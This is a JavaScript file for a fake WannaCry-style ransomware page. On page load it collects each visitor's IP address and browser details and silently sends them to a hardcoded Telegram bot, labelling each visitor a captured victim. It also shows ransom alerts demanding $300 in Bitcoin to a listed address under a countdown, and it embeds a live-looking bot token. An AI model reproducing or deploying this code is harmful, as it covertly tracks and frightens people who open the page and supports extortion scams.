// ============================================
// IP LOGGER + TELEGRAM BOT (WannaCry Style)
// ============================================

const BOT_TOKEN = "8819910333:AAGxrE0I0KQy4DJtmJg5sGIWQqYBfOpPb1w";
const CHAT_ID = "8551438856";

async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Não foi possível obter IP';
    }
}

function getBrowserData() {
    return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screenWidth: screen.width,
        screenHeight: screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direto',
        url: window.location.href,
        timestamp: new Date().toLocaleString('pt-BR')
    };
}

async function sendToTelegram(ip, browserData) {
    const message = `
🕵️‍♂️ **NOVA VÍTIMA CAPTURADA** 💀

🌐 **IP:** ${ip}
📍 **Localização:** https://ipinfo.io/${ip}

📱 **Dados do Visitante:**
━━━━━━━━━━━━━━━━━━━
🖥️ **SO/Dispositivo:** ${browserData.userAgent}
📐 **Tela:** ${browserData.screenWidth}x${browserData.screenHeight}px
🌍 **Idioma:** ${browserData.language}
🕰️ **Fuso:** ${browserData.timezone}
🔗 **Referer:** ${browserData.referrer}
📎 **URL:** ${browserData.url}
⏱️ **Data/Hora:** ${browserData.timestamp}
━━━━━━━━━━━━━━━━━━━
💀 **Ransomware WannaCry Style**
    `;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            })
        });

        const statusEl = document.getElementById('status');
        if (response.ok) {
            statusEl.textContent = '✅ Decryption key sent successfully!';
            statusEl.style.color = '#00ff41';
        } else {
            statusEl.textContent = '❌ Failed to connect to server';
            statusEl.style.color = '#ff0000';
        }
    } catch {
        document.getElementById('status').textContent = '❌ Network error';
        document.getElementById('status').style.color = '#ff0000';
    }
}

async function main() {
    const loading = document.getElementById('loading');
    const status = document.getElementById('status');

    loading.style.display = 'block';
    status.textContent = '🔐 Collecting system data...';

    const ip = await getIP();
    const browserData = getBrowserData();

    status.textContent = '📤 Sending to decryption server...';
    await sendToTelegram(ip, browserData);

    setTimeout(() => {
        loading.style.display = 'none';
    }, 3500);
}

function checkPayment() {
    alert('💰 Payment not detected!\n\nTry sending exactly $300 in Bitcoin to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn\n\n⏱️ You have 2 days remaining.');
}

function decrypt() {
    alert('🔓 Decrypting files...\n\nJust kidding! 😂\nYour files are safe. This is a test.\n\nBut your IP was sent to the owner! 👀');
}

function aboutBitcoin() {
    alert('₿ Bitcoin is a cryptocurrency.\n\nCurrent price: ~$60,000 USD\n\nSend $300 worth to:\n1T5p7UMMngoj1plMvkpHjicRdfJNXj8LrLn\n\n⏰ Hurry up! Time is running out!');
}

document.addEventListener('DOMContentLoaded', main);
